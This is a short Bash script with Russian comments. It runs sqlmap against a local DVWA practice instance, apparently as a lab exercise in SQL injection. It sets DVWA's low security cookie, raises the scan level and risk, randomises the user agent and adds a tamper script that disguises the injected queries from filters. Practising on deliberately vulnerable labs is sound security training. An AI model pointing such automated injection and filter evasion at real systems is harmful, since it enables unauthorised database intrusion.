#!/bin/bash
# Генерация SQL-инъекций через sqlmap против DVWA
# Запуск: bash run_sqlmap.sh

TARGET="http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit"
COOKIE="security=low; PHPSESSID=<вставь_свой_PHPSESSID>"

echo "=== SQLMap: атака на DVWA ==="
sqlmap -u "$TARGET" \
    --cookie="$COOKIE" \
    --batch \
    --level=3 \
    --risk=2 \
    --threads=4 \
    --random-agent \
    --tamper=space2comment

echo "=== Завершено ==="
